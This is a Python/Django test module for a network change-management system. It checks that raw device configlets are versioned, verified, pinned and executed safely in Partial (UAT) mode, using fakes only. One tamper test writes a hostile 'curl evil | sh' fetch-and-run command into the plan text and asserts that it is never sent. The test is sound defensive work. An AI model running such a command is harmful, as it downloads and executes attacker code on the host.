"""Phase-18 integration: Change currency, whole-Change validation, the ONE planner, and the ONE Phase-17 execution engine.

A Raw Configlet is an opaque, verified artifact: it must move through exactly the same validation -> plan -> precheck -> Partial (UAT)
execution pipeline as structured intent, with nothing weakened.  Everything runs on fakes (scripted verifier, ``RecordingWorld``);
no sandbox, device, NetBox or Slack is contacted.
"""

from __future__ import annotations

import contextlib
import json
from types import SimpleNamespace
from unittest import mock

from django.test import TestCase

from core import models
from core.services import (
    change_plan_service as cps, change_validation_service as cvs, execution_service as es, raw_configlet_service as rcs,
)
from core.services.planning.errors import PlanGenerationError
from core.services.raw_configlets import text as text_module
from core.services.validation import snapshot as snapshot_module
from core.tests.helpers import execution as ex, raw as rh
from core.tests.helpers.validation import codes as finding_codes, simple_pass_change, validate

ADDRESS_ASSERTION = {"kind": "ADDRESS_PRESENT", "interface": "Loopback99", "address": "192.0.2.99/32"}
P = models.ExecutionMode.PARTIAL_UAT


def snapshot_hash(change):
    return snapshot_module.hash_snapshot(snapshot_module.build_change_snapshot(change))


def plan_for(p):
    validate(p.change, p.sources)
    return cps.build_change_plan(p.change, actor="tester", sources=p.sources)[0]


def blockers(result):
    return [b["code"] for b in result.blockers]


class ChangeInputAndCurrencyTests(TestCase):
    def test_the_raw_section_exists_only_with_raw_input_so_historical_hashes_are_unchanged(self):
        f = simple_pass_change()
        base = snapshot_module.build_change_snapshot(f.change)
        self.assertNotIn("raw_configlets", base)                      # a Change without raw keeps its exact pre-Phase-18 canonical form
        base_hash = snapshot_module.hash_snapshot(base)
        raw, revision = rcs.create_raw_configlet(f.change, target_device="R1", name="n", content=rh.EOS_TEXT, priority=6, actor="tester")
        with_raw = snapshot_module.build_change_snapshot(f.change)
        self.assertIn("raw_configlets", with_raw)
        self.assertNotIn("Loopback99", json.dumps(with_raw))          # only the revision number + content hash are hashed, never the text
        steps = [("created, never verified", None)]
        hashes = [snapshot_module.hash_snapshot(with_raw)]
        rh.verify(revision)
        hashes.append(snapshot_hash(f.change)); steps.append(("verified", None))
        new, _ = rcs.save_revision(raw, target_device="R1", name="n", content=rh.EOS_TEXT.replace("99", "98"), priority=6, actor="tester")
        hashes.append(snapshot_hash(f.change)); steps.append(("edited (new revision)", None))
        rh.verify(new)
        hashes.append(snapshot_hash(f.change)); steps.append(("re-verified", None))
        rcs.save_revision(raw, target_device="R1", name="n", content=rh.EOS_TEXT.replace("99", "98"), priority=7, actor="tester")
        hashes.append(snapshot_hash(f.change)); steps.append(("priority changed", None))
        self.assertEqual(len(set(hashes + [base_hash])), len(hashes) + 1, list(zip((s[0] for s in steps), hashes)))
        priority_hash = hashes[-1]
        rcs.set_enabled(raw, False, actor="tester")
        self.assertEqual(snapshot_hash(f.change), base_hash)          # effective removal == never having had it
        rcs.set_enabled(raw, True, actor="tester")
        self.assertEqual(snapshot_hash(f.change), priority_hash)      # deterministic

    def test_every_effective_raw_change_makes_earlier_validation_and_plan_stale(self):
        def edit(p):
            rcs.save_revision(p.raw, target_device="R1", name="Loopback", content=rh.EOS_TEXT + "   no shutdown\n", priority=6, actor="tester")

        rows = [
            ("text edit", edit),
            ("retarget", lambda p: rcs.save_revision(p.raw, target_device="R2", name="Loopback", content=rh.EOS_TEXT, priority=6, actor="tester")),
            ("reorder (priority)", lambda p: rcs.save_revision(p.raw, target_device="R1", name="Loopback", content=rh.EOS_TEXT, priority=3, actor="tester")),
            ("remove from Change", lambda p: rcs.set_enabled(p.raw, False, actor="tester")),
            ("explicit re-verification", lambda p: rh.verify(p.revision, reuse=False)),
        ]
        for case, mutate in rows:
            with self.subTest(case=case):
                p = rh.verified()
                plan = plan_for(p)
                self.assertEqual((cvs.get_validation_currency(p.change)["state"], cps.get_plan_currency(plan)["state"]), ("CURRENT", "CURRENT"))
                mutate(p)
                self.assertEqual(cvs.get_validation_currency(p.change)["state"], "STALE")
                self.assertEqual(cps.get_plan_currency(plan)["state"], "STALE")
                self.assertEqual(cps.check_eligibility(p.change)["code"], "VALIDATION_STALE")   # no plan is built from a stale input

    def test_a_policy_or_verifier_version_change_stales_validation_without_any_edit(self):
        for target in ("POLICY_VERSION", "VERIFIER_VERSION"):
            with self.subTest(constant=target):
                p = rh.verified()
                validate(p.change, p.sources)
                self.assertEqual(cvs.get_validation_currency(p.change)["state"], "CURRENT")
                with mock.patch(f"core.services.raw_configlets.codes.{target}", "18.9.9"):
                    self.assertEqual(cvs.get_validation_currency(p.change)["state"], "STALE")


class ValidationAndPlanningTests(TestCase):
    def test_validation_requires_a_current_acceptable_verification_and_never_plans_otherwise(self):
        def never(): return rh.raw_change()
        def passed(**kw): return rh.verified(**kw)
        def bad(*script):
            p = rh.raw_change(); rh.verify(p.revision, *script); return p
        def stale():
            p = rh.verified(); return p
        def mismatch():
            p = rh.verified(); p.f.r1.switch_platform(models.Platform.UBUNTU_FRR); return p

        rows = [
            ("never verified", never, "BLOCKED", "RAW_NOT_VERIFIED", None),
            ("syntax rejected", lambda: bad(*rh.REJECT), "BLOCKED", "RAW_VERIFICATION_BLOCKED", None),
            ("sandbox incomplete", lambda: bad("SANDBOX_TIMEOUT"), "INCOMPLETE", "RAW_VERIFICATION_INCOMPLETE", None),
            ("stale (policy version)", stale, "BLOCKED", "RAW_VERIFICATION_STALE", ("POLICY_VERSION", "18.9.9")),
            ("device platform changed", mismatch, "BLOCKED", "RAW_PLATFORM_MISMATCH", None),
            ("pass", passed, "PASS", None, None),
            ("pass with warnings", lambda: bad(*rh.ACCEPT, "PLATFORM_WARNING"), "PASS_WITH_WARNINGS", "RAW_VERIFICATION_WARNINGS", None),
            ("FRR: verifiable but not executable", lambda: passed(text=rh.FRR_TEXT, device="R3", frr_device=True), "PASS_WITH_WARNINGS", "RAW_EXECUTION_NOT_SUPPORTED", None),
        ]
        for case, build, status, code, patch in rows:
            with self.subTest(case=case):
                p = build()
                scope = mock.patch(f"core.services.raw_configlets.codes.{patch[0]}", patch[1]) if patch else contextlib.nullcontext()
                with scope:                                        # the state under test (e.g. a version bump) holds for validation AND planning
                    run = validate(p.change, p.sources)
                    self.assertEqual(run.status, status, finding_codes(run))
                    if code:
                        self.assertIn(code, finding_codes(run))
                    if status in ("BLOCKED", "INCOMPLETE"):
                        with self.assertRaises(PlanGenerationError) as caught:
                            cps.build_change_plan(p.change, actor="tester", sources=p.sources)
                        self.assertIn(caught.exception.code, ("VALIDATION_BLOCKED", "VALIDATION_INCOMPLETE"))
                    else:
                        self.assertTrue(cps.build_change_plan(p.change, actor="tester", sources=p.sources)[1])

    def test_explicit_dependencies_are_validated_and_dependency_overrides_priority_deterministically(self):
        missing = rh.verified(dependencies=["R1/interface/if_does_not_exist"])
        self.assertIn("DEPENDENCY_MISSING", finding_codes(validate(missing.change, missing.sources)))
        cyc = rh.raw_change(dependencies=["R1/raw_configlet/RAW-002"])
        second, rev2 = rcs.create_raw_configlet(cyc.change, target_device="R1", name="b", content=rh.EOS_TEXT_2, priority=6,
                                                dependencies=["R1/raw_configlet/RAW-001"], actor="tester")
        rh.verify(cyc.revision); rh.verify(rev2)
        run = validate(cyc.change, cyc.sources)
        self.assertEqual((run.status, "DEPENDENCY_CYCLE" in finding_codes(run)), ("BLOCKED", True))
        # a raw declared priority 1 that depends on an interface (priority 2): the DEPENDENCY wins, and the plan says so
        p = simple_pass_change()
        iface = f"R1/interface/{p.a['id']}"
        raw, rev = rcs.create_raw_configlet(p.change, target_device="R1", name="early", content=rh.EOS_TEXT, priority=1, dependencies=[iface], actor="tester")
        rh.verify(rev)
        plan = plan_for(SimpleNamespace(change=p.change, sources=p.sources))
        order = [c.cfg_id for c in plan.configlets.order_by("sequence")]
        raw_cfg = rh.raw_cfg(plan)
        interface_cfg = plan.configlets.get(desired_state_ref__source__node_id=iface)
        self.assertLess(order.index(interface_cfg.cfg_id), order.index(raw_cfg.cfg_id))
        self.assertIn(interface_cfg.cfg_id, [d["cfg_id"] for d in raw_cfg.metadata["dependencies"]])
        self.assertIn("PRIORITY_DEPENDENCY_INVERSION", [w["code"] for w in plan.warnings])
        run = plan.validation_run
        self.assertEqual(cps.compute_plan(p.change, run)["plan_hash"], cps.compute_plan(p.change, run)["plan_hash"])   # deterministic

    def test_the_plan_pins_the_exact_revision_and_verification_and_history_never_changes(self):
        p = rh.verified(assertions=[ADDRESS_ASSERTION])
        plan = plan_for(p)
        configlet = rh.raw_cfg(plan)
        self.assertEqual((configlet.origin, configlet.raw_revision_id, configlet.raw_verification_id), ("RAW", p.revision.pk, p.run.pk))
        self.assertEqual(configlet.rendered_config, p.revision.content.rstrip("\n"))
        pins = configlet.metadata["raw"]
        self.assertEqual((pins["revision"], pins["content_hash"], pins["verification_run_id"]), (1, p.revision.content_hash, str(p.run.run_id)))
        self.assertEqual({c.origin for c in plan.configlets.exclude(pk=configlet.pk)}, {"STRUCTURED"})
        self.assertEqual([r["requirement"] for r in configlet.verification_spec["requirements"]], ["ADDRESS_PRESENT"])
        self.assertIn("RAW_CONFIGLETS_OPAQUE", [w["code"] for w in plan.warnings])
        with self.assertRaises(ValueError):                              # pinned facts are frozen with the plan
            configlet.origin = "STRUCTURED"
            configlet.save()
        # edit + re-verify + re-validate + re-plan: a NEW plan, while the historical one is byte-for-byte what it was
        new, _ = rcs.save_revision(p.raw, target_device="R1", name="Loopback", content=rh.EOS_TEXT + "   no shutdown\n", priority=6,
                                   assertions=[ADDRESS_ASSERTION], actor="tester")
        rh.verify(new)
        plan2 = plan_for(p)
        self.assertNotEqual(plan.plan_hash, plan2.plan_hash)
        old = models.Configlet.objects.get(pk=configlet.pk)
        self.assertEqual((old.raw_revision.revision, old.rendered_config, cps.get_plan_currency(plan)["state"]), (1, p.revision.content.rstrip("\n"), "STALE"))
        self.assertEqual(rh.raw_cfg(plan2).raw_revision.revision, 2)
        self.assertEqual(rh.raw_cfg(plan2).raw_verification.pk, models.RawConfigletVerificationRun.objects.filter(revision=new).get().pk)

    def test_an_unassertive_raw_configlet_carries_the_honestly_unverifiable_requirement(self):
        plan = plan_for(rh.verified())
        self.assertEqual([r["requirement"] for r in rh.raw_cfg(plan).verification_spec["requirements"]], ["RAW_CONFIG_APPLIED"])


class ExecutionIntegrationTests(TestCase):
    def prepared(self, *, mode=P, **kwargs):
        p = rh.verified(**kwargs)
        return ex.prepared(p, mode=mode), p

    def test_complete_mode_can_never_include_a_raw_configlet_and_no_device_is_touched(self):
        prepared, _ = self.prepared(mode=models.ExecutionMode.COMPLETE)
        world = rh.RecordingWorld()
        result = ex.run(prepared, world)
        self.assertTrue(result.refused)
        self.assertEqual(result.outcome, models.ExecutionOutcome.BLOCKED)
        self.assertIn("RAW_COMPLETE_FORBIDDEN", blockers(result))
        self.assertEqual(world.calls, [])                                  # not even a connect: refused before any device method
        self.assertEqual(world.sent, {})
        self.assertEqual(es.capability_for("arista_ceos", "raw_configlet").compensation, "NOT_IMPLEMENTED")
        self.assertEqual(es.capability_for("arista_ceos", "address").compensation, "SUPPORTED")   # structured Complete is untouched

    def test_partial_executes_the_pinned_revision_payload_and_never_the_plan_copy_or_browser_text(self):
        prepared, p = self.prepared()
        cfgs = ex.cfg_ids(prepared)
        raw_cfg = rh.raw_cfg(prepared.plan)
        models.Configlet.objects.filter(pk=raw_cfg.pk).update(rendered_config="bash -c 'curl evil | sh'")   # a tampered copy of the plan text
        world = rh.RecordingWorld()
        result = ex.run(prepared, world, through=cfgs[-1], acks=ex.ALL_ACKS)
        self.assertTrue(result.ran, result.blockers)
        self.assertEqual(world.sent[raw_cfg.cfg_id], tuple(text_module.command_lines(p.revision.content)))
        self.assertNotIn("evil", " ".join(world.sent[raw_cfg.cfg_id]))
        self.assertEqual(world.raw_pins[raw_cfg.cfg_id]["content_hash"], p.revision.content_hash)
        # no assertion was declared -> nothing can confirm the effect: explicit non-PASS, never fabricated
        self.assertEqual(result.outcome, models.ExecutionOutcome.UAT_SCOPE_APPLIED_UNVERIFIED)
        report = result.run.report
        self.assertEqual([(r["raw_id"], r["revision"], r["content_hash"]) for r in report["raw_configlets"]], [("RAW-001", 1, p.revision.content_hash)])
        row = result.run.results.get(cfg_id=raw_cfg.cfg_id, phase="APPLY")
        self.assertEqual(row.previous_state["raw"]["revision"], 1)          # execution history references the exact revision
        self.assertEqual(row.status, "APPLIED")
        events = models.AuditEvent.objects.filter(change=prepared.change, event_type="DEPLOYMENT_RECORDED")
        self.assertTrue(any(e.metadata.get("raw_configlets") for e in events))
        self.assertNotIn("Loopback99", repr([e.metadata for e in events]))  # audit carries pins, never text

    def test_partial_keeps_every_uat_gate_and_the_ordered_prefix_semantics(self):
        prepared, p = self.prepared()
        cfgs = ex.cfg_ids(prepared)
        raw_id = rh.raw_cfg(prepared.plan).cfg_id
        world = rh.RecordingWorld()
        refused = ex.run(prepared, world, through=cfgs[-1], acks=None)
        self.assertEqual(sorted(set(blockers(refused))), ["UAT_ACK_MISSING"])
        partial_acks = {**ex.ALL_ACKS, "uat_ack_operator_accepts_risk": False}
        self.assertIn("UAT_ACK_MISSING", blockers(ex.run(prepared, world, through=cfgs[-1], acks=partial_acks)))
        self.assertIn("UAT_SCOPE_REQUIRED", blockers(ex.run(prepared, world, through="", acks=ex.ALL_ACKS)))
        self.assertEqual(world.calls, [])                                   # every refusal happened before any device method
        earlier = ex.run(prepared, world, through=cfgs[0], acks=ex.ALL_ACKS)   # an earlier prefix does not reach the raw Configlet
        self.assertTrue(earlier.ran, earlier.blockers)
        self.assertEqual(world.sent, {})
        self.assertIn(raw_id, earlier.run.report["state"]["out_of_scope"])

    def test_a_raw_failure_stops_the_run_and_preserves_everything_applied_before_it(self):
        prepared, _ = self.prepared()
        cfgs = ex.cfg_ids(prepared)
        raw_id = rh.raw_cfg(prepared.plan).cfg_id
        world = rh.RecordingWorld()
        world.fail_apply[raw_id] = ("COMMAND_REJECTED", True)
        result = ex.run(prepared, world, through=cfgs[-1], acks=ex.ALL_ACKS)
        self.assertEqual(result.outcome, models.ExecutionOutcome.FAILED_PARTIAL_APPLIED)
        earlier = [c for c in cfgs if c != raw_id and cfgs.index(c) < cfgs.index(raw_id)]
        self.assertEqual(world.applied(), [*earlier, raw_id])
        self.assertEqual(world.compensated(), [])                           # Partial (UAT) never rolls back
        self.assertEqual(world.state["R1"]["addresses"]["Ethernet1"], ["192.0.2.0/31"])   # the applied prefix is preserved
        self.assertEqual(result.run.report["state"]["failed"], [raw_id])

    def test_the_postcheck_of_a_raw_configlet_comes_only_from_declared_assertions(self):
        rows = [
            ("declared fact absent on the device", None, models.ExecutionOutcome.UAT_SCOPE_APPLIED_POSTCHECK_FAILED),
            ("declared fact present on the device", lambda w, s: w.state["R1"]["addresses"].setdefault("Loopback99", []).append("192.0.2.99/32"),
             models.ExecutionOutcome.UAT_SCOPE_APPLIED),
        ]
        for case, effect, expected in rows:
            with self.subTest(case=case):
                prepared, _ = self.prepared(assertions=[ADDRESS_ASSERTION])
                world = rh.RecordingWorld()
                world.raw_effect = effect
                result = ex.run(prepared, world, through=ex.cfg_ids(prepared)[-1], acks=ex.ALL_ACKS)
                self.assertEqual(result.outcome, expected, result.run.report.get("postcheck"))

    def test_stale_verification_tampering_and_unsupported_platforms_block_before_any_device_method(self):
        def stale():
            prepared, _ = self.prepared()
            return prepared, mock.patch("core.services.raw_configlets.codes.POLICY_VERSION", "18.9.9"), {"RAW_VERIFICATION_NOT_CURRENT", "VALIDATION_STALE"}

        def tampered():
            prepared, p = self.prepared()
            models.RawConfigletRevision.objects.filter(pk=p.revision.pk).update(content="hostname changed\n")
            return prepared, contextlib.nullcontext(), {"RAW_REVISION_INTEGRITY"}

        def unsupported():
            prepared, _ = self.prepared(text=rh.FRR_TEXT, device="R3", frr_device=True)
            return prepared, contextlib.nullcontext(), {"PLATFORM_EXECUTION_UNSUPPORTED"}

        for case, build, in (("stale verification", stale), ("tampered pinned revision", tampered), ("raw on an unsupported platform (FRR)", unsupported)):
            with self.subTest(case=case):
                prepared, patcher, expected = build()
                world = rh.RecordingWorld(devices=("R1", "R2", "R3"))
                with patcher:
                    result = ex.run(prepared, world, through=ex.cfg_ids(prepared)[-1], acks=ex.ALL_ACKS)
                self.assertTrue(result.refused)
                self.assertTrue(expected <= set(blockers(result)), blockers(result))
                self.assertEqual((world.calls, world.sent), ([], {}))

    def test_a_linux_executor_refuses_a_raw_configlet_even_if_its_text_looks_like_iproute2(self):
        from core.services.execution.executors.base import ConfigletSpec
        from core.services.execution.executors.linux import LinuxExecutor

        spec = ConfigletSpec("CFG-001", 1, "R3", "ubuntu_frr", "raw_configlet", "ACTIVATE_ATTACH", ("ip addr replace 192.0.2.1/32 dev lo",), origin="RAW")
        executor = LinuxExecutor({"name": "R3", "container": "x"}, runner=mock.Mock(side_effect=AssertionError("must not run")), reader=mock.Mock())
        self.assertEqual(executor.assess(spec).action, "REFUSE")
